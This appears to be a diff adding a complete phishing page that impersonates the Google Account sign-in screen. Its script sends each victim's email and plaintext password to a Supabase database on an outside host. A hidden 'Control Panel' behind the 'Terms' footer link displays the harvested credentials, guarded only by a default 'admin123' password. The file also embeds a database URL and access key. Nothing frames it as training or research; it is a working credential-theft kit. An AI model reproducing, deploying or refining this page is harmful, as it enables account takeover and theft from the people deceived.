@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Account</title>
+    
+    <!-- Supabase CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fff;
+            color: #202124;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        /* Header Styles */
+        header {
+            padding: 16px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+        }
+        
+        .nav-links {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .nav-links a {
+            text-decoration: none;
+            color: #5f6368;
+            font-size: 13px;
+        }
+        
+        .nav-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .apps-icon {
+            width: 24px;
+            height: 24px;
+            padding: 8px;
+            border-radius: 50%;
+            cursor: pointer;
+            opacity: 0.6;
+        }
+        
+        .apps-icon:hover {
+            background-color: #f0f0f0;
+            opacity: 0.8;
+        }
+        
+        .profile-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background-color: #8e75c2;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-left: 8px;
+            cursor: pointer;
+        }
+        
+        /* Main Content Styles */
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .logo {
+            margin-bottom: 20px;
+        }
+        
+        .google-logo {
+            font-size: 42px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+        
+        .google-logo span:nth-child(1) { color: #4285F4; }
+        .google-logo span:nth-child(2) { color: #EA4335; }
+        .google-logo span:nth-child(3) { color: #FBBC05; }
+        .google-logo span:nth-child(4) { color: #4285F4; }
+        .google-logo span:nth-child(5) { color: #34A853; }
+        .google-logo span:nth-child(6) { color: #EA4335; }
+        
+        .logo-text {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 40px;
+            color: #202124;
+        }
+        
+        .signin-card {
+            width: 100%;
+            max-width: 450px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+        }
+        
+        .signin-title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            text-align: center;
+            color: #202124;
+        }
+        
+        .signin-subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 35px;
+            text-align: center;
+            color: #202124;
+        }
+        
+        .input-field {
+            width: 100%;
+            height: 55px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 13px 15px;
+            font-size: 16px;
+            margin-bottom: 25px;
+            outline: none;
+            transition: border 0.2s;
+        }
+        
+        .input-field:focus {
+            border: 2px solid #1a73e8;
+        }
+        
+        .password-container {
+            position: relative;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 15px;
+            background: none;
+            border: none;
+            color: #1a73e8;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        
+        .forgot-email, .forgot-password {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 40px;
+            display: inline-block;
+        }
+        
+        .forgot-email:hover, .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .info-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 40px;
+            line-height: 1.5;
+        }
+        
+        .info-text a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+        
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+            padding: 8px 0;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .next-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .next-button:hover {
+            background-color: #1b66c9;
+        }
+        
+        /* Control Panel Styles */
+        .control-panel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: #f8f9fa;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 15px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            z-index: 100;
+            width: 450px;
+            max-height: 500px;
+            overflow-y: auto;
+            display: none;
+        }
+        
+        .control-panel h3 {
+            margin-bottom: 15px;
+            color: #202124;
+            font-size: 16px;
+            font-weight: 500;
+            text-align: center;
+            border-bottom: 1px solid #dadce0;
+            padding-bottom: 10px;
+        }
+        
+        .data-section {
+            margin-bottom: 15px;
+        }
+        
+        .data-section h4 {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        .data-item {
+            background-color: white;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 10px;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        
+        .data-label {
+            font-weight: 500;
+            color: #202124;
+        }
+        
+        .data-value {
+            color: #5f6368;
+            margin-top: 5px;
+            word-break: break-all;
+        }
+        
+        .empty-data {
+            text-align: center;
+            color: #5f6368;
+            font-style: italic;
+            padding: 10px;
+        }
+        
+        .clear-data {
+            background-color: #ea4335;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 12px;
+            font-size: 12px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .clear-data:hover {
+            background-color: #d33426;
+        }
+        
+        /* Password Protection Styles */
+        .password-protection {
+            margin-bottom: 15px;
+        }
+        
+        .password-protection h4 {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        .password-input-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .password-input {
+            flex: 1;
+            height: 40px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 0 10px;
+            font-size: 14px;
+        }
+        
+        .submit-password {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 0 15px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .submit-password:hover {
+            background-color: #1b66c9;
+        }
+        
+        .error-message {
+            color: #ea4335;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .success-message {
+            color: #34A853;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        /* Loading Spinner */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Admin Settings Styles */
+        .admin-settings {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid #dadce0;
+        }
+        
+        .admin-settings h4 {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        .change-password-form {
+            margin-bottom: 10px;
+        }
+        
+        .password-field {
+            margin-bottom: 8px;
+        }
+        
+        .change-password-btn {
+            background-color: #34A853;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 12px;
+            font-size: 12px;
+            cursor: pointer;
+            width: 100%;
+        }
+        
+        .change-password-btn:hover {
+            background-color: #2E8B47;
+        }
+        
+        /* Footer Styles */
+        footer {
+            background-color: #f2f2f2;
+            padding: 0 20px;
+        }
+        
+        .footer-top {
+            padding: 15px 0;
+            border-bottom: 1px solid #dadce0;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        
+        .footer-bottom {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            padding: 15px 0;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 25px;
+        }
+        
+        .footer-links a {
+            text-decoration: none;
+            color: #5f6368;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Responsive Styles */
+        @media (max-width: 600px) {
+            .signin-card {
+                border: none;
+                padding: 20px;
+            }
+            
+            .footer-bottom {
+                justify-content: center;
+            }
+            
+            .footer-links {
+                justify-content: center;
+            }
+            
+            .control-panel {
+                width: 90%;
+                right: 5%;
+                left: 5%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="nav-links">
+            <a href="#">Gmail</a>
+            <a href="#">Images</a>
+            <svg class="apps-icon" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M6,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM16,6c0,1.1 0.9,2 2,2s2,-0.9 2,-2 -0.9,-2 -2,-2 -2,0.9 -2,2zM12,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2z"></path>
+            </svg>
+            <div class="profile-icon">A</div>
+        </div>
+    </header>
+    
+    <main>
+        <div class="logo">
+            <div class="google-logo">
+                <span>G</span>
+                <span>o</span>
+                <span>o</span>
+                <span>g</span>
+                <span>l</span>
+                <span>e</span>
+            </div>
+        </div>
+        
+        <!-- Email Step -->
+        <div id="email-step" class="signin-card">
+            <h1 class="signin-title">Sign in</h1>
+            <p class="signin-subtitle">Use your Google Account</p>
+            
+            <form id="email-form">
+                <input type="email" class="input-field" id="email-input" placeholder="Email or phone" required autofocus>
+                
+                <a href="#" class="forgot-email">Forgot email?</a>
+                
+                <p class="info-text">
+                    Not your computer? Use Guest mode to sign in privately.
+                    <a href="#">Learn more</a>
+                </p>
+                
+                <div class="button-group">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="button" class="next-button" id="email-next">Next</button>
+                </div>
+            </form>
+        </div>
+        
+        <!-- Password Step -->
+        <div id="password-step" class="signin-card" style="display: none;">
+            <h1 class="signin-title">Welcome</h1>
+            <p class="signin-subtitle">Enter your password</p>
+            
+            <form id="password-form">
+                <div class="password-container">
+                    <input type="password" class="input-field" id="password-input" placeholder="Enter your password" required autofocus>
+                    <button type="button" class="toggle-password" id="toggle-password">Show</button>
+                </div>
+                
+                <a href="#" class="forgot-password">Forgot password?</a>
+                
+                <div class="button-group">
+                    <a href="#" class="create-account" id="back-to-email">Back</a>
+                    <button type="button" class="next-button" id="password-next">
+                        <span id="next-text">Next</span>
+                        <div class="loading" id="loading-spinner" style="display: none;"></div>
+                    </button>
+                </div>
+            </form>
+        </div>
+    </main>
+    
+    <!-- Control Panel -->
+    <div class="control-panel" id="control-panel">
+        <h3>Control Panel - Saved Data</h3>
+        
+        <!-- Password Protection -->
+        <div class="password-protection" id="password-protection">
+            <h4>Enter Admin Password to View Data</h4>
+            <div class="password-input-container">
+                <input type="password" class="password-input" id="admin-password" placeholder="Enter admin password">
+                <button class="submit-password" id="submit-password">Submit</button>
+            </div>
+            <div class="error-message" id="password-error">Incorrect password. Please try again.</div>
+        </div>
+        
+        <!-- Data Sections (Initially Hidden) -->
+        <div id="data-sections" style="display: none;">
+            <div class="data-section">
+                <h4>Email Addresses</h4>
+                <div id="email-data">
+                    <div class="empty-data">Loading data from database...</div>
+                </div>
+            </div>
+            
+            <div class="data-section">
+                <h4>Passwords</h4>
+                <div id="password-data">
+                    <div class="empty-data">Loading data from database...</div>
+                </div>
+            </div>
+            
+            <!-- Admin Settings -->
+            <div class="admin-settings">
+                <h4>Admin Settings</h4>
+                <div class="change-password-form">
+                    <div class="password-field">
+                        <input type="password" class="password-input" id="new-password" placeholder="New admin password">
+                    </div>
+                    <div class="password-field">
+                        <input type="password" class="password-input" id="confirm-password" placeholder="Confirm new password">
+                    </div>
+                    <button class="change-password-btn" id="change-password-btn">Change Admin Password</button>
+                </div>
+                <div class="success-message" id="password-success">Password changed successfully!</div>
+                <div class="error-message" id="password-change-error"></div>
+            </div>
+            
+            <button class="clear-data" id="clear-data">Clear All Data from Database</button>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="footer-top">
+            English (United States)
+        </div>
+        <div class="footer-bottom">
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#" id="terms-button">Terms</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Supabase Configuration with your credentials
+        const SUPABASE_URL = 'https://ztquxqnjeihklisikeeo.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inp0cXV4cW5qZWloa2xpc2lrZWVvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjM2NDAwNTUsImV4cCI6MjA3OTIxNjA1NX0.XP6nkw7u6cBnFZJBezhyN7KVxo7CK9JAPwp6o3ToqB0';
+
+        // Supabase client initialize karein
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        // DOM Elements
+        const emailStep = document.getElementById('email-step');
+        const passwordStep = document.getElementById('password-step');
+        const emailInput = document.getElementById('email-input');
+        const passwordInput = document.getElementById('password-input');
+        const emailNext = document.getElementById('email-next');
+        const passwordNext = document.getElementById('password-next');
+        const backToEmail = document.getElementById('back-to-email');
+        const togglePassword = document.getElementById('toggle-password');
+        const termsButton = document.getElementById('terms-button');
+        const controlPanel = document.getElementById('control-panel');
+        const emailData = document.getElementById('email-data');
+        const passwordData = document.getElementById('password-data');
+        const clearData = document.getElementById('clear-data');
+        const adminPasswordInput = document.getElementById('admin-password');
+        const submitPassword = document.getElementById('submit-password');
+        const passwordError = document.getElementById('password-error');
+        const passwordProtection = document.getElementById('password-protection');
+        const dataSections = document.getElementById('data-sections');
+        const nextText = document.getElementById('next-text');
+        const loadingSpinner = document.getElementById('loading-spinner');
+        const newPasswordInput = document.getElementById('new-password');
+        const confirmPasswordInput = document.getElementById('confirm-password');
+        const changePasswordBtn = document.getElementById('change-password-btn');
+        const passwordSuccess = document.getElementById('password-success');
+        const passwordChangeError = document.getElementById('password-change-error');
+        
+        // Data storage
+        let savedEmails = [];
+        let savedPasswords = [];
+        let currentEmail = '';
+        
+        // Admin password (stored in localStorage)
+        let adminPassword = localStorage.getItem('adminPassword') || "admin123";
+        
+        // Initialize admin password if not set
+        if (!localStorage.getItem('adminPassword')) {
+            localStorage.setItem('adminPassword', adminPassword);
+        }
+        
+        // Show password step when email is submitted
+        emailNext.addEventListener('click', function() {
+            if (emailInput.value) {
+                currentEmail = emailInput.value;
+                emailStep.style.display = 'none';
+                passwordStep.style.display = 'block';
+            } else {
+                alert('Please enter your email address');
+            }
+        });
+        
+        // Go back to email step
+        backToEmail.addEventListener('click', function() {
+            passwordStep.style.display = 'none';
+            emailStep.style.display = 'block';
+        });
+        
+        // Toggle password visibility
+        togglePassword.addEventListener('click', function() {
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                togglePassword.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                togglePassword.textContent = 'Show';
+            }
+        });
+        
+        // Submit password form
+        passwordNext.addEventListener('click', async function() {
+            if (passwordInput.value) {
+                // Show loading
+                nextText.style.display = 'none';
+                loadingSpinner.style.display = 'inline-block';
+                passwordNext.disabled = true;
+                
+                try {
+                    // Save data to Supabase
+                    await saveToSupabase(currentEmail, passwordInput.value);
+                    
+                    alert('Login successful! Data saved to database.');
+                    
+                    // Reset forms
+                    emailInput.value = '';
+                    passwordInput.value = '';
+                    passwordStep.style.display = 'none';
+                    emailStep.style.display = 'block';
+                    currentEmail = '';
+                    
+                } catch (error) {
+                    console.error('Error saving data:', error);
+                    alert('Error saving data. Please try again.');
+                } finally {
+                    // Hide loading
+                    nextText.style.display = 'inline';
+                    loadingSpinner.style.display = 'none';
+                    passwordNext.disabled = false;
+                }
+            } else {
+                alert('Please enter your password');
+            }
+        });
+        
+        // Toggle control panel with password protection
+        termsButton.addEventListener('click', async function() {
+            // Reset password protection
+            adminPasswordInput.value = '';
+            passwordError.style.display = 'none';
+            passwordProtection.style.display = 'block';
+            dataSections.style.display = 'none';
+            
+            if (controlPanel.style.display === 'block') {
+                controlPanel.style.display = 'none';
+            } else {
+                controlPanel.style.display = 'block';
+            }
+        });
+        
+        // Close control panel when clicking outside
+        document.addEventListener('click', function(event) {
+            if (!controlPanel.contains(event.target) && event.target !== termsButton) {
+                controlPanel.style.display = 'none';
+            }
+        });
+        
+        // Check admin password
+        submitPassword.addEventListener('click', async function() {
+            if (adminPasswordInput.value === adminPassword) {
+                // Correct password - show data
+                passwordProtection.style.display = 'none';
+                dataSections.style.display = 'block';
+                await loadDataFromSupabase();
+                updateControlPanel();
+            } else {
+                // Incorrect password - show error
+                passwordError.style.display = 'block';
+                adminPasswordInput.value = '';
+            }
+        });
+        
+        // Allow pressing Enter to submit password
+        adminPasswordInput.addEventListener('keypress', function(event) {
+            if (event.key === 'Enter') {
+                submitPassword.click();
+            }
+        });
+        
+        // Change admin password
+        changePasswordBtn.addEventListener('click', function() {
+            const newPassword = newPasswordInput.value;
+            const confirmPassword = confirmPasswordInput.value;
+            
+            // Reset messages
+            passwordSuccess.style.display = 'none';
+            passwordChangeError.style.display = 'none';
+            
+            // Validate passwords
+            if (!newPassword || !confirmPassword) {
+                passwordChangeError.textContent = 'Please fill in both password fields';
+                passwordChangeError.style.display = 'block';
+                return;
+            }
+            
+            if (newPassword !== confirmPassword) {
+                passwordChangeError.textContent = 'Passwords do not match';
+                passwordChangeError.style.display = 'block';
+                return;
+            }
+            
+            if (newPassword.length < 4) {
+                passwordChangeError.textContent = 'Password must be at least 4 characters long';
+                passwordChangeError.style.display = 'block';
+                return;
+            }
+            
+            // Update admin password
+            adminPassword = newPassword;
+            localStorage.setItem('adminPassword', newPassword);
+            
+            // Show success message
+            passwordSuccess.style.display = 'block';
+            
+            // Clear password fields
+            newPasswordInput.value = '';
+            confirmPasswordInput.value = '';
+            
+            // Hide success message after 3 seconds
+            setTimeout(() => {
+                passwordSuccess.style.display = 'none';
+            }, 3000);
+        });
+        
+        // Save data to Supabase
+        async function saveToSupabase(email, password) {
+            const { data, error } = await supabase
+                .from('users_data')
+                .insert([
+                    { 
+                        email: email, 
+                        password: password 
+                    }
+                ]);
+            
+            if (error) {
+                throw error;
+            }
+            return data;
+        }
+        
+        // Load data from Supabase
+        async function loadDataFromSupabase() {
+            try {
+                const { data, error } = await supabase
+                    .from('users_data')
+                    .select('*')
+                    .order('created_at', { ascending: false });
+                
+                if (error) {
+                    throw error;
+                }
+                
+                // Update local arrays
+                savedEmails = data.map(item => item.email);
+                savedPasswords = data.map(item => item.password);
+                
+            } catch (error) {
+                console.error('Error loading data:', error);
+                emailData.innerHTML = '<div class="empty-data">Error loading data from database</div>';
+                passwordData.innerHTML = '<div class="empty-data">Error loading data from database</div>';
+            }
+        }
+        
+        // Clear all data from Supabase
+        async function clearSupabaseData() {
+            try {
+                const { error } = await supabase
+                    .from('users_data')
+                    .delete()
+                    .neq('id', '00000000-0000-0000-0000-000000000000'); // Delete all records
+                
+                if (error) {
+                    throw error;
+                }
+                
+                // Clear local arrays
+                savedEmails = [];
+                savedPasswords = [];
+                
+            } catch (error) {
+                console.error('Error clearing data:', error);
+                throw error;
+            }
+        }
+        
+        // Update control panel with saved data
+        function updateControlPanel() {
+            // Update email data
+            if (savedEmails.length > 0) {
+                emailData.innerHTML = '';
+                savedEmails.forEach((email, index) => {
+                    const emailItem = document.createElement('div');
+                    emailItem.className = 'data-item';
+                    emailItem.innerHTML = `
+                        <div class="data-label">Email #${index + 1}</div>
+                        <div class="data-value">${email}</div>
+                    `;
+                    emailData.appendChild(emailItem);
+                });
+            } else {
+                emailData.innerHTML = '<div class="empty-data">No email data saved yet</div>';
+            }
+            
+            // Update password data - show actual passwords
+            if (savedPasswords.length > 0) {
+                passwordData.innerHTML = '';
+                savedPasswords.forEach((password, index) => {
+                    const passwordItem = document.createElement('div');
+                    passwordItem.className = 'data-item';
+                    passwordItem.innerHTML = `
+                        <div class="data-label">Password #${index + 1}</div>
+                        <div class="data-value">${password}</div>
+                    `;
+                    passwordData.appendChild(passwordItem);
+                });
+            } else {
+                passwordData.innerHTML = '<div class="empty-data">No password data saved yet</div>';
+            }
+        }
+        
+        // Clear all saved data
+        clearData.addEventListener('click', async function() {
+            if (confirm('Are you sure you want to clear ALL data from the database? This action cannot be undone.')) {
+                try {
+                    await clearSupabaseData();
+                    updateControlPanel();
+                    alert('All data has been cleared from database!');
+                } catch (error) {
+                    alert('Error clearing data. Please try again.');
+                }
+            }
+        });
+
+        // Check Supabase connection on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('Supabase connected successfully');
+        });
+    </script>
+</body>
+</html>
